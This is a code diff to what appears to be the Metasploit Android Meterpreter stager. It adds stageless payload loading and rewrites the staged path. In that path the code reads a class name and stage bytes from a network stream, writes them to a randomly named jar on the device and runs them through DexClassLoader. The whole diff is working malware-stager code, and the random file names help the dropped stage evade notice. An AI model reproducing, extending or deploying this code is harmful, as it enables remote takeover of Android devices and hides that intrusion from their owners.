@@ -13,6 +13,7 @@ import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URL;
 import java.net.URLConnection;
+import java.util.Random;
 import java.util.concurrent.TimeUnit;
 
 import dalvik.system.DexClassLoader;
@@ -30,6 +31,7 @@ public class Payload {
     private static long retry_total;
     private static long retry_wait;
     private static byte[] cert_hash;
+    private static String stageless_class;
 
     private static Object[] parameters;
 
@@ -62,10 +64,12 @@ public class Payload {
         long retryTotal;
         long retryWait;
 
-        // socket handle is 4 bytes, followed by exit func, both of
-        // which we ignore.
-        int csr = 8;
+        // if the first byte != 0 this is a stageless payload
+        if (configBytes[0] != 0) {
+            stageless_class = ConfigParser.readString(configBytes, 8000, 100);
+        }
 
+        int csr = 8;
         sessionExpiry = ConfigParser.unpack32(configBytes, csr);
         csr += 4;
         byte[] uuid = ConfigParser.readBytes(configBytes, csr, ConfigParser.UUID_LEN);
@@ -153,40 +157,48 @@ public class Payload {
         }
     }
 
+    private static byte[] loadBytes(DataInputStream in) throws Exception {
+        int byteLen = in.readInt();
+        byte[] bytes = new byte[byteLen];
+        int n = 0;
+        while (n < byteLen) {
+            int count = in.read(bytes, n, byteLen - n);
+            if (count < 0)
+                throw new Exception();
+            n += count;
+        }
+        return bytes;
+    }
+
     private static void runNextStage(DataInputStream in, OutputStream out, Object[] parameters) throws Exception {
-        try {
+        if (stageless_class != null) {
             Class<?> existingClass = Payload.class.getClassLoader().
-                    loadClass("com.metasploit.meterpreter.AndroidMeterpreter");
+                    loadClass(stageless_class);
             existingClass.getConstructor(new Class[]{
                     DataInputStream.class, OutputStream.class, Object[].class, boolean.class
             }).newInstance(in, out, parameters, false);
-        } catch (ClassNotFoundException e) {
+        } else {
             String path = (String) parameters[0];
-            String filePath = path + File.separatorChar + "payload.jar";
-            String dexPath = path + File.separatorChar + "payload.dex";
+            String filePath = path + File.separatorChar + Integer.toString(new Random().nextInt(Integer.MAX_VALUE), 36);
+            String jarPath = filePath + ".jar";
+            String dexPath = filePath + ".dex";
 
             // Read the class name
-            int coreLen = in.readInt();
-            byte[] core = new byte[coreLen];
-            in.readFully(core);
-            String classFile = new String(core);
+            String classFile = new String(loadBytes(in));
 
             // Read the stage
-            coreLen = in.readInt();
-            core = new byte[coreLen];
-            in.readFully(core);
-
-            File file = new File(filePath);
+            byte[] stageBytes = loadBytes(in);
+            File file = new File(jarPath);
             if (!file.exists()) {
                 file.createNewFile();
             }
             FileOutputStream fop = new FileOutputStream(file);
-            fop.write(core);
+            fop.write(stageBytes);
             fop.flush();
             fop.close();
 
             // Load the stage
-            DexClassLoader classLoader = new DexClassLoader(filePath, path, path,
+            DexClassLoader classLoader = new DexClassLoader(jarPath, path, path,
                     Payload.class.getClassLoader());
             Class<?> myClass = classLoader.loadClass(classFile);
             final Object stage = myClass.newInstance();
